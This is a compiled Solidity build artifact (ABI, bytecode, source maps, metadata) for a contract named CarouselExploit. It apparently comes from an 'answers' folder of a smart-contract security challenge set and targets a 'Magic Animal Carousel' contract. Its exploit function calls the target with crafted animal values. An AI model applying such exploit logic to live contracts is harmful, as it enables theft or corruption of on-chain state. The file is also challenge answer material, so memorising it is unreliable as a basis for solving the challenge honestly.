{"abi":[{"type":"constructor","inputs":[{"name":"_carousel","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"carousel","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IMagicAnimalCarousel"}],"stateMutability":"view"},{"type":"function","name":"checkState","inputs":[],"outputs":[{"name":"crate0","type":"uint256","internalType":"uint256"},{"name":"crate1","type":"uint256","internalType":"uint256"},{"name":"currentId","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506040516105bc3803806105bc833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b610536806100865f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c806363d9b770146100435780638f8fa52f1461004d57806396dfcbea1461007c575b5f5ffd5b61004b61009f565b005b5f5461005f906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b610084610393565b60408051938452602084019290925290820152606001610073565b5f546040517fab3b922400000000000000000000000000000000000000000000000000000000815260206004820152600360248201527f636174000000000000000000000000000000000000000000000000000000000060448201526001600160a01b039091169063ab3b9224906064015f604051808303815f87803b158015610127575f5ffd5b505af1158015610139573d5f5f3e3d5ffd5b505050505f5f5f9054906101000a90046001600160a01b03166001600160a01b03166326bad99e6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561018d573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101b191906104e9565b5f80546040516324da12f560e21b81526004810183905292935090916001600160a01b03909116906393684bd490602401602060405180830381865afa1580156101fd573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061022191906104e9565b5f80546040516324da12f560e21b81526001600482015292935090916001600160a01b03909116906393684bd490602401602060405180830381865afa15801561026d573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061029191906104e9565b5f80546040516324c8a27360e21b81529293506001600160a01b03169163932289cc916102d39160040160408082525f90820152602081019190915260600190565b5f604051808303815f87803b1580156102ea575f5ffd5b505af11580156102fc573d5f5f3e3d5ffd5b50505f8054604080516324c8a27360e21b81526004810191909152600360448201527f646f670000000000000000000000000000000000000000000000000000000000606482015260248101929092526001600160a01b0316925063932289cc91506084015f604051808303815f87803b158015610378575f5ffd5b505af115801561038a573d5f5f3e3d5ffd5b50505050505050565b5f80546040516324da12f560e21b815260048101839052829182916001600160a01b03909116906393684bd490602401602060405180830381865afa1580156103de573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061040291906104e9565b5f546040516324da12f560e21b8152600160048201529194506001600160a01b0316906393684bd490602401602060405180830381865afa158015610449573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061046d91906104e9565b91505f5f9054906101000a90046001600160a01b03166001600160a01b03166326bad99e6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156104be573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104e291906104e9565b9050909192565b5f602082840312156104f9575f5ffd5b505191905056fea264697066735822122000bc8be2125bd8e4085f8581d79b2be7f0a564e44b19d75a7bfb27fb5a13644564736f6c634300081c0033","sourceMap":"370:1152:0:-:0;;;448:90;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;489:8;:42;;-1:-1:-1;;;;;;489:42:0;-1:-1:-1;;;;;489:42:0;;;;;;;;;;370:1152;;14:290:1;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:1;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:1:o;:::-;370:1152:0;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405234801561000f575f5ffd5b506004361061003f575f3560e01c806363d9b770146100435780638f8fa52f1461004d57806396dfcbea1461007c575b5f5ffd5b61004b61009f565b005b5f5461005f906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b610084610393565b60408051938452602084019290925290820152606001610073565b5f546040517fab3b922400000000000000000000000000000000000000000000000000000000815260206004820152600360248201527f636174000000000000000000000000000000000000000000000000000000000060448201526001600160a01b039091169063ab3b9224906064015f604051808303815f87803b158015610127575f5ffd5b505af1158015610139573d5f5f3e3d5ffd5b505050505f5f5f9054906101000a90046001600160a01b03166001600160a01b03166326bad99e6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561018d573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101b191906104e9565b5f80546040516324da12f560e21b81526004810183905292935090916001600160a01b03909116906393684bd490602401602060405180830381865afa1580156101fd573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061022191906104e9565b5f80546040516324da12f560e21b81526001600482015292935090916001600160a01b03909116906393684bd490602401602060405180830381865afa15801561026d573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061029191906104e9565b5f80546040516324c8a27360e21b81529293506001600160a01b03169163932289cc916102d39160040160408082525f90820152602081019190915260600190565b5f604051808303815f87803b1580156102ea575f5ffd5b505af11580156102fc573d5f5f3e3d5ffd5b50505f8054604080516324c8a27360e21b81526004810191909152600360448201527f646f670000000000000000000000000000000000000000000000000000000000606482015260248101929092526001600160a01b0316925063932289cc91506084015f604051808303815f87803b158015610378575f5ffd5b505af115801561038a573d5f5f3e3d5ffd5b50505050505050565b5f80546040516324da12f560e21b815260048101839052829182916001600160a01b03909116906393684bd490602401602060405180830381865afa1580156103de573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061040291906104e9565b5f546040516324da12f560e21b8152600160048201529194506001600160a01b0316906393684bd490602401602060405180830381865afa158015610449573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061046d91906104e9565b91505f5f9054906101000a90046001600160a01b03166001600160a01b03166326bad99e6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156104be573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104e291906104e9565b9050909192565b5f602082840312156104f9575f5ffd5b505191905056fea264697066735822122000bc8be2125bd8e4085f8581d79b2be7f0a564e44b19d75a7bfb27fb5a13644564736f6c634300081c0033","sourceMap":"370:1152:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;548:734;;;:::i;:::-;;401:36;;;;;-1:-1:-1;;;;;401:36:0;;;;;;-1:-1:-1;;;;;205:55:1;;;187:74;;175:2;160:18;401:36:0;;;;;;;;1292:228;;;:::i;:::-;;;;474:25:1;;;530:2;515:18;;508:34;;;;558:18;;;551:34;462:2;447:18;1292:228:0;272:319:1;548:734:0;648:8;;:32;;;;;798:2:1;648:32:0;;;780:21:1;837:1;817:18;;;810:29;875:5;855:18;;;848:33;-1:-1:-1;;;;;648:8:0;;;;:25;;898:18:1;;648:32:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;734:17;754:8;;;;;;;;;-1:-1:-1;;;;;754:8:0;-1:-1:-1;;;;;754:23:0;;:25;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;789:13;805:8;;:20;;-1:-1:-1;;;805:20:0;;;;;1270:25:1;;;734:45:0;;-1:-1:-1;789:13:0;;-1:-1:-1;;;;;805:8:0;;;;:17;;1243:18:1;;805:20:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;835:13;851:8;;:20;;-1:-1:-1;;;851:20:0;;:8;:20;;;1270:25:1;789:36:0;;-1:-1:-1;835:13:0;;-1:-1:-1;;;;;851:8:0;;;;:17;;1243:18:1;;851:20:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1085:8;;;:28;;-1:-1:-1;;;1085:28:0;;835:36;;-1:-1:-1;;;;;;1085:8:0;;:21;;:28;;;;1734:2:1;1716:21;;;1773:1;1753:18;;;1746:29;1841:4;1826:20;;1819:36;;;;1807:2;1792:18;;1496:365;1085:28:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1244:8:0;;;:31;;;-1:-1:-1;;;1244:31:0;;;;;2086:21:1;;;;2143:1;2123:18;;;2116:29;2181:5;2161:18;;;2154:33;2239:20;;;2232:36;;;;-1:-1:-1;;;;;1244:8:0;;-1:-1:-1;1244:21:0;;-1:-1:-1;2204:19:1;;1244:31:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;576:706;;;548:734::o;1292:228::-;1337:14;1407:8;;:20;;-1:-1:-1;;;1407:20:0;;;;;1270:25:1;;;1337:14:0;;;;-1:-1:-1;;;;;1407:8:0;;;;:17;;1243:18:1;;1407:20:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1446:8;;:20;;-1:-1:-1;;;1446:20:0;;:8;:20;;;1270:25:1;1398:29:0;;-1:-1:-1;;;;;;1446:8:0;;:17;;1243:18:1;;1446:20:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1437:29;;1488:8;;;;;;;;;-1:-1:-1;;;;;1488:8:0;-1:-1:-1;;;;;1488:23:0;;:25;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1476:37;;1292:228;;;:::o;927:184:1:-;997:6;1050:2;1038:9;1029:7;1025:23;1021:32;1018:52;;;1066:1;1063;1056:12;1018:52;-1:-1:-1;1089:16:1;;927:184;-1:-1:-1;927:184:1:o","linkReferences":{}},"methodIdentifiers":{"carousel()":"8f8fa52f","checkState()":"96dfcbea","exploit()":"63d9b770"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_carousel\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"carousel\",\"outputs\":[{\"internalType\":\"contract IMagicAnimalCarousel\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"checkState\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"crate0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"crate1\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"currentId\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exploit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/answers/CarouselExploit.sol\":\"CarouselExploit\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"src/answers/CarouselExploit.sol\":{\"keccak256\":\"0x5873c9bff3dcfa3a4be86b96b8687191f570120752bde6a39e558e6856126e66\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://cb0c3c42483e148f6658fb829837fa304fe35b06fe523ddd518f01497dd506b3\",\"dweb:/ipfs/QmbQjey638nuwhL1nKJNrG1EgW2TtLFcGtATGPTubLQqgm\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.28+commit.7893614a"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"_carousel","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"stateMutability":"view","type":"function","name":"carousel","outputs":[{"internalType":"contract IMagicAnimalCarousel","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"checkState","outputs":[{"internalType":"uint256","name":"crate0","type":"uint256"},{"internalType":"uint256","name":"crate1","type":"uint256"},{"internalType":"uint256","name":"currentId","type":"uint256"}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"exploit"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/answers/CarouselExploit.sol":"CarouselExploit"},"evmVersion":"shanghai","libraries":{}},"sources":{"src/answers/CarouselExploit.sol":{"keccak256":"0x5873c9bff3dcfa3a4be86b96b8687191f570120752bde6a39e558e6856126e66","urls":["bzz-raw://cb0c3c42483e148f6658fb829837fa304fe35b06fe523ddd518f01497dd506b3","dweb:/ipfs/QmbQjey638nuwhL1nKJNrG1EgW2TtLFcGtATGPTubLQqgm"],"license":"MIT"}},"version":1},"id":0}